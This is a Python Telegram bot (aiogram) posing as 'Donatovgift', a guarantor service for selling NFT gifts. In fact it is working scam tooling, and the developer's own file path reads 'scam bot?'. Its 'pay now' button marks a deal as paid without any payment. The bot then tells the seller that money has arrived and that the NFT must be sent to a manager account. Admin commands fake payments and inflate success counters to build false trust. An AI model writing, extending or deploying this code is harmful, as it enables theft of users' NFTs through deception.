import asyncio
import logging
import os
import time
import uuid
from typing import Dict

from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from dotenv import load_dotenv

# Загружаем переменные окружения из .env файла
load_dotenv()  # если файл называется иначе, укажите имя: load_dotenv('apppy.env')

# ⚠️ ВАЖНО: в файле .env должна быть строка: BOT_TOKEN=ваш_токен
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "5118322610"))
BOT_USERNAME = os.getenv("BOT_USERNAME", "DonatovGifts_bot")
MANAGER_USERNAME = "@Donatovgift_manager"  # контакт менеджера

# Путь к приветственной картинке (локальный файл)
WELCOME_IMAGE_PATH = "/Users/vladislav/Desktop/Скам бот?/photo_2026-01-21_23-55-40.jpg"

logging.basicConfig(level=logging.INFO)

# Проверка наличия токена
if not TOKEN:
    raise ValueError(
        "Токен бота не найден! Укажите BOT_TOKEN в файле .env"
    )

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# Состояния FSM для создания сделки
class CreateDeal(StatesGroup):
    gift = State()
    currency = State()
    price = State()
    requisites = State()


# Хранилища данных
deals: Dict[str, dict] = {}                # активные сделки
admins: set[int] = {ADMIN_ID}               # множество администраторов
user_successful_deals: Dict[int, int] = {}  # успешные сделки пользователя
user_deals_count: Dict[int, int] = {}       # общее количество созданных сделок
DEAL_TIMEOUT = 3600  # время жизни сделки (1 час)


def is_admin(user_id: int) -> bool:
    """Проверка, является ли пользователь администратором"""
    return user_id in admins


async def create_deal_id() -> str:
    """Генерация уникального ID сделки (8 символов)"""
    for _ in range(50):
        deal_id = uuid.uuid4().hex[:8].upper()
        if deal_id not in deals:
            return deal_id
    raise RuntimeError("Не удалось создать уникальный ID после 50 попыток")


async def send_log_to_admin(user_id: int, username: str, action: str, extra: str = ""):
    """Отправка лога администратору"""
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📊 <b>{action}</b>\n👤 <code>{user_id}</code>\n📝 @{username or 'нет'}\n{extra}",
            parse_mode="HTML"
        )
    except Exception:
        pass


def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    """Главное меню с кнопками и статистикой пользователя"""
    success = user_successful_deals.get(user_id, 0)
    total = user_deals_count.get(user_id, 0)

    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(text="💼 Создать сделку", callback_data="create_deal"))
    builder.add(InlineKeyboardButton(text=f"✅ {success}/{total}", callback_data="my_stats"))
    if is_admin(user_id):
        builder.add(InlineKeyboardButton(text="👑 АДМИН ПАНЕЛЬ", callback_data="admin_panel"))
    builder.add(InlineKeyboardButton(text="💬 Поддержка", url=f"https://t.me/{MANAGER_USERNAME[1:]}"))
    builder.add(InlineKeyboardButton(text="⭐ Отзывы", url="https://t.me/Donatovgifts_review"))
    builder.adjust(1)  # все кнопки в один столбец
    return builder.as_markup()


# ----------------------------------------------------------------------
# Обработчик команды /start с возможностью deep linking и картинкой
# ----------------------------------------------------------------------
@dp.message(CommandStart())
async def cmd_start(message: Message):
    """Приветствие с картинкой и меню"""
    args = message.text.split(maxsplit=1)

    # Если перешли по ссылке с параметром deal_XXXX
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].replace("deal_", "")
        await show_payment_window(message, deal_id)
        return

    # Логируем запуск
    await send_log_to_admin(
        message.from_user.id,
        message.from_user.username,
        "Старт бота"
    )

    # Текст приветствия
    welcome_text = (
        "🎁 <b>Donatovgift — безопасная торговля NFT</b>\n\n"
        "Добро пожаловать! Здесь вы можете создавать сделки по продаже NFT-подарков "
        "и безопасно получать оплату через гаранта.\n"
        "• Мгновенное создание сделки\n"
        "• Оплата напрямую через бота\n"
        "• Поддержка 24/7\n\n"
        "Нажмите кнопку ниже, чтобы начать 👇"
    )

    # Пытаемся отправить приветственную картинку
    try:
        if os.path.exists(WELCOME_IMAGE_PATH):
            photo = FSInputFile(WELCOME_IMAGE_PATH)
            await message.answer_photo(
                photo=photo,
                caption=welcome_text,
                reply_markup=get_main_menu(message.from_user.id),
                parse_mode="HTML"
            )
        else:
            # Если файл не найден, отправляем только текст
            await message.answer(
                welcome_text,
                reply_markup=get_main_menu(message.from_user.id),
                parse_mode="HTML"
            )
    except Exception as e:
        logging.error(f"Ошибка при отправке фото: {e}")
        await message.answer(
            welcome_text,
            reply_markup=get_main_menu(message.from_user.id),
            parse_mode="HTML"
        )


# ----------------------------------------------------------------------
# Окно оплаты при переходе по ссылке на сделку
# ----------------------------------------------------------------------
async def show_payment_window(message: Message, deal_id: str):
    """Отображает информацию о сделке и кнопку оплаты"""
    if deal_id not in deals:
        await message.answer(
            "❌ Сделка не найдена или уже завершена.",
            reply_markup=get_main_menu(message.from_user.id)
        )
        return

    deal = deals[deal_id]
    if deal.get('paid', False):
        await message.answer(
            "✅ Эта сделка уже оплачена и выполнена.",
            reply_markup=get_main_menu(message.from_user.id)
        )
        return

    # Запоминаем, кто сейчас просматривает сделку (потенциальный покупатель)
    deals[deal_id]['current_buyer'] = message.from_user.id

    seller_success = user_successful_deals.get(deal['seller_id'], 0)
    symbol = "₽" if deal['currency'] == "Рубли" else "⭐"

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="💳 ОПЛАТИТЬ СЕЙЧАС",
        callback_data=f"pay_now_{deal_id}"
    ))
    if is_admin(message.from_user.id):
        builder.row(InlineKeyboardButton(
            text="🔥 НАКРУТИТЬ (админ)",
            callback_data=f"admin_pay_{deal_id}"
        ))
    builder.row(InlineKeyboardButton(
        text="❌ Отмена",
        callback_data="main_menu"
    ))

    text = (
        f"💳 <b>ОПЛАТА СДЕЛКИ #{deal_id}</b>\n\n"
        f"📦 <b>{deal['gift']}</b>\n"
        f"💰 <b>{deal['price']} {symbol}</b>\n"
        f"💳 <b>Способ оплаты: {deal['currency']}</b>\n"
        f"✅ <b>Продавец выполнил {seller_success} успешных сделок</b>\n\n"
        f"<i>Нажмите кнопку «ОПЛАТИТЬ СЕЙЧАС», чтобы подтвердить перевод.</i>"
    )

    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="HTML")


# ----------------------------------------------------------------------
# Обработка нажатия кнопки "Оплатить сейчас"
# ----------------------------------------------------------------------
@dp.callback_query(F.data.startswith("pay_now_"))
async def instant_payment(callback: CallbackQuery):
    """Мгновенная оплата от покупателя"""
    deal_id = callback.data.replace("pay_now_", "")
    await callback.answer("✅ Оплата принята!")
    await process_deal_payment(callback.from_user, deal_id)

    # Инструкция для покупателя
    text = (
        f"✅ <b>Оплата зафиксирована!</b>\n\n"
        f"📲 Для получения NFT свяжитесь с менеджером:\n"
        f"{MANAGER_USERNAME}\n\n"
        f"🔐 Укажите ID сделки: <code>{deal_id}</code>"
    )
    await callback.message.edit_text(
        text,
        reply_markup=get_main_menu(callback.from_user.id),
        parse_mode="HTML"
    )


@dp.callback_query(F.data.startswith("admin_pay_"))
async def admin_fake_payment(callback: CallbackQuery):
    """Админская накрутка оплаты (для тестов)"""
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет доступа", show_alert=True)
        return

    deal_id = callback.data.replace("admin_pay_", "")
    await process_deal_payment(callback.from_user, deal_id)
    await callback.answer("🔥 Накручено!")


async def process_deal_payment(user, deal_id: str):
    """Общая логика обработки оплаты (уведомление продавца, обновление статистики)"""
    if deal_id not in deals or deals[deal_id].get('paid', False):
        return

    deal = deals[deal_id]
    deal['paid'] = True
    deal['buyer_id'] = user.id
    deal['buyer_username'] = user.username

    # Увеличиваем счётчик успешных сделок продавца
    seller_id = deal['seller_id']
    user_successful_deals[seller_id] = user_successful_deals.get(seller_id, 0) + 1

    symbol = "₽" if deal['currency'] == "Рубли" else "⭐"

    # Уведомление продавцу
    seller_text = (
        f"💰 <b>Пользователь переслал деньги!</b>\n\n"
        f"Для завершения сделки передайте NFT менеджеру {MANAGER_USERNAME}\n"
        f"<b>⚠️ Обязательно отправляйте NFT только менеджеру, иначе гарантия не работает!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Сделка #{deal_id}</b>\n"
        f"🎁 <b>{deal['gift']}</b>\n"
        f"💰 <b>{deal['price']} {symbol}</b>\n"
        f"💳 <b>Реквизиты:</b> <code>{deal['requisites']}</code>\n\n"
        f"✅ Теперь у вас <b>{user_successful_deals[seller_id]} успешных сделок</b>"
    )

    await bot.send_message(seller_id, seller_text, parse_mode="HTML")
    await send_log_to_admin(
        user.id,
        user.username,
        f"ОПЛАТА {deal_id}",
        f"Подарок: {deal['gift']}"
    )


# ----------------------------------------------------------------------
# FSM: создание новой сделки
# ----------------------------------------------------------------------
@dp.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    """Начало создания сделки"""
    # Проверка лимита для обычных пользователей
    if not is_admin(callback.from_user.id):
        count = user_deals_count.get(callback.from_user.id, 0)
        if count >= 5:
            await callback.answer(
                "⏳ Вы достигли лимита в 5 активных сделок.",
                show_alert=True
            )
            return

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await callback.message.edit_text(
        "🎁 <b>Шаг 1/4 — Название подарка</b>\n\n"
        "Введите название NFT-подарка (от 3 до 100 символов):",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.gift)
    await callback.answer()


@dp.callback_query(F.data == "cancel_deal")
async def cancel_deal(callback: CallbackQuery, state: FSMContext):
    """Отмена создания сделки"""
    await state.clear()
    await callback.message.edit_text(
        "❌ Создание сделки отменено.",
        reply_markup=get_main_menu(callback.from_user.id)
    )
    await callback.answer()


@dp.message(CreateDeal.gift)
async def process_gift(message: Message, state: FSMContext):
    """Шаг 1: получение названия подарка"""
    gift = message.text.strip()
    if len(gift) < 3 or len(gift) > 100:
        await message.answer("❌ Название должно содержать от 3 до 100 символов.")
        return

    await state.update_data(gift=gift)

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="₽ Рубли", callback_data="currency_rub"))
    builder.row(InlineKeyboardButton(text="⭐ Звёзды Telegram", callback_data="currency_stars"))
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await message.answer(
        f"✅ <b>Подарок:</b> {gift}\n\n"
        f"💰 <b>Шаг 2/4 — Выберите валюту:</b>",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.currency)


@dp.callback_query(CreateDeal.currency, F.data.startswith("currency_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    """Шаг 2: выбор валюты"""
    currency = "Рубли" if callback.data == "currency_rub" else "Звёзды Telegram"
    await state.update_data(currency=currency)

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await callback.message.edit_text(
        f"✅ <b>Валюта:</b> {currency}\n\n"
        f"💵 <b>Шаг 3/4 — Укажите цену</b>\n"
        f"(целое число от 1 до 100 000):",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.price)
    await callback.answer()


@dp.message(CreateDeal.price)
async def process_price(message: Message, state: FSMContext):
    """Шаг 3: ввод цены"""
    price = message.text.strip().replace(" ", "")
    if not price.isdigit():
        await message.answer("❌ Цена должна быть числом.")
        return
    price_int = int(price)
    if not (1 <= price_int <= 100000):
        await message.answer("❌ Цена должна быть от 1 до 100 000.")
        return

    await state.update_data(price=price)

    data = await state.get_data()
    req_type = "номер карты" if data['currency'] == "Рубли" else "username получателя звёзд"

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))

    await message.answer(
        f"✅ <b>Цена:</b> {price} {'₽' if data['currency'] == 'Рубли' else '⭐'}\n\n"
        f"💳 <b>Шаг 4/4 — Введите {req_type}</b>:",
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDeal.requisites)


@dp.message(CreateDeal.requisites)
async def process_requisites(message: Message, state: FSMContext):
    """Шаг 4: реквизиты и завершение создания сделки"""
    requisites = message.text.strip()
    if not requisites:
        await message.answer("❌ Реквизиты не могут быть пустыми.")
        return

    await state.update_data(requisites=requisites)
    data = await state.get_data()

    # Генерируем уникальный ID сделки
    deal_id = await create_deal_id()
    deals[deal_id] = {
        'seller_id': message.from_user.id,
        'seller_username': message.from_user.username,
        'gift': data['gift'],
        'price': data['price'],
        'currency': data['currency'],
        'requisites': data['requisites'],
        'paid': False,
        'current_buyer': None,
        'created_at': time.time()  # время создания
    }

    # Увеличиваем счётчик созданных сделок (кроме админов)
    if not is_admin(message.from_user.id):
        user_deals_count[message.from_user.id] = user_deals_count.get(message.from_user.id, 0) + 1

    # Формируем ссылку на сделку
    share_text = (
        f"Сделка #{deal_id}\n"
        f"{data['gift']} за {data['price']} "
        f"{'₽' if data['currency'] == 'Рубли' else '⭐'}\n"
        f"🔗 https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    )

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="📤 ПЕРЕСЛАТЬ ПОКУПАТЕЛЮ",
        switch_inline_query=share_text
    ))
    builder.row(InlineKeyboardButton(
        text="🏠 В главное меню",
        callback_data="main_menu"
    ))

    symbol = "₽" if data['currency'] == "Рубли" else "⭐"
    text = (
        f"✅ <b>Сделка успешно создана!</b>\n\n"
        f"🆔 <b>#{deal_id}</b>\n"
        f"🎁 {data['gift']}\n"
        f"💰 {data['price']} {symbol}\n\n"
        f"📤 Нажмите кнопку ниже, чтобы отправить ссылку покупателю."
    )

    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await send_log_to_admin(
        message.from_user.id,
        message.from_user.username,
        f"СОЗДАНА {deal_id}",
        data['gift']
    )
    await state.clear()


# ----------------------------------------------------------------------
# Прочие обработчики (главное меню, статистика, админ-команды)
# ----------------------------------------------------------------------
@dp.callback_query(F.data == "main_menu")
async def main_menu_handler(callback: CallbackQuery):
    """Возврат в главное меню"""
    await callback.message.edit_text(
        "🏠 Главное меню",
        reply_markup=get_main_menu(callback.from_user.id)
    )
    await callback.answer()


@dp.callback_query(F.data == "my_stats")
async def my_stats_handler(callback: CallbackQuery):
    """Показывает статистику пользователя"""
    success = user_successful_deals.get(callback.from_user.id, 0)
    total = user_deals_count.get(callback.from_user.id, 0)
    await callback.answer(
        f"📊 Успешных сделок: {success}\n📦 Всего создано: {total}",
        show_alert=True
    )


@dp.callback_query(F.data == "admin_panel")
async def admin_panel_handler(callback: CallbackQuery):
    """Админ-панель (заглушка)"""
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text(
        "👑 <b>Админ-панель</b>\n\n"
        "Доступные команды:\n"
        "• <code>/deals</code> — список активных сделок\n"
        "• <code>/fake_pay ID</code> — пометить сделку как оплаченную\n"
        "• <code>/setdeals число</code> — установить количество созданных сделок\n"
        "• <code>/set_success число</code> — установить количество успехов\n\n"
        "Также в окне оплаты сделки для админа появляется кнопка «НАКРУТИТЬ».",
        reply_markup=get_main_menu(callback.from_user.id),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.message(Command("setdeals"))
async def set_deals(message: Message):
    """Админская команда: установить количество созданных сделок"""
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Использование: /setdeals <число>")
        return
    try:
        count = int(args[1])
        user_deals_count[message.from_user.id] = count
        await message.answer(f"✅ Количество сделок установлено: {count}")
    except ValueError:
        await message.answer("❌ Введите целое число.")


@dp.message(Command("set_success"))
async def set_success(message: Message):
    """Админская команда: установить количество успешных сделок"""
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Использование: /set_success <число>")
        return
    try:
        count = int(args[1])
        user_successful_deals[message.from_user.id] = count
        await message.answer(f"✅ Количество успехов установлено: {count}")
    except ValueError:
        await message.answer("❌ Введите целое число.")


@dp.message(Command("stats"))
async def show_stats(message: Message):
    """Показывает статистику пользователя"""
    success = user_successful_deals.get(message.from_user.id, 0)
    total = user_deals_count.get(message.from_user.id, 0)
    await message.answer(
        f"📊 <b>Ваша статистика</b>\n\n"
        f"✅ Успешных сделок: {success}\n"
        f"📦 Всего создано сделок: {total}",
        parse_mode="HTML"
    )


# ==================== НОВЫЕ АДМИНСКИЕ КОМАНДЫ ====================

@dp.message(Command("deals"))
async def list_deals(message: Message):
    """Админская команда: /deals — показать все активные сделки"""
    if not is_admin(message.from_user.id):
        return
    if not deals:
        await message.answer("📭 Нет активных сделок.")
        return
    lines = []
    for deal_id, deal in deals.items():
        if deal.get('paid', False):
            status = "✅ оплачена"
        else:
            status = "⏳ ожидает"
        symbol = "₽" if deal['currency'] == "Рубли" else "⭐"
        created = time.strftime('%d.%m %H:%M', time.localtime(deal.get('created_at', 0)))
        lines.append(
            f"<code>{deal_id}</code> | {deal['gift'][:20]} | {deal['price']}{symbol} | {status} | {created}"
        )
    text = "📋 <b>Активные сделки:</b>\n" + "\n".join(lines)
    # Разбиваем на части, если слишком длинное сообщение
    if len(text) > 4000:
        for x in range(0, len(text), 4000):
            await message.answer(text[x:x+4000], parse_mode="HTML")
    else:
        await message.answer(text, parse_mode="HTML")


@dp.message(Command("fake_pay"))
async def fake_pay_command(message: Message):
    """Админская команда: /fake_pay ID_сделки — пометить сделку как оплаченную"""
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Использование: /fake_pay <ID_сделки>")
        return
    deal_id = args[1].upper()
    if deal_id not in deals:
        await message.answer("❌ Сделка с таким ID не найдена.")
        return
    if deals[deal_id].get('paid', False):
        await message.answer("❌ Эта сделка уже оплачена.")
        return
    # Вызываем process_deal_payment от имени администратора
    await process_deal_payment(message.from_user, deal_id)
    await message.answer(f"✅ Сделка {deal_id} помечена как оплаченная.")


# ----------------------------------------------------------------------
# Фоновая задача для удаления просроченных сделок
# ----------------------------------------------------------------------
async def cleanup_loop():
    """Каждые 5 минут удаляет сделки старше DEAL_TIMEOUT"""
    while True:
        await asyncio.sleep(300)  # 5 минут
        current_time = time.time()
        expired = [
            deal_id
            for deal_id, deal in list(deals.items())
            if current_time - deal.get('created_at', 0) > DEAL_TIMEOUT
        ]
        for deal_id in expired:
            del deals[deal_id]
        if expired:
            logging.info(f"Удалено просроченных сделок: {len(expired)}")


# ----------------------------------------------------------------------
# Запуск бота
# ----------------------------------------------------------------------
async def main():
    # Создаём фоновую задачу для очистки
    asyncio.create_task(cleanup_loop())
    logging.info("Бот запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
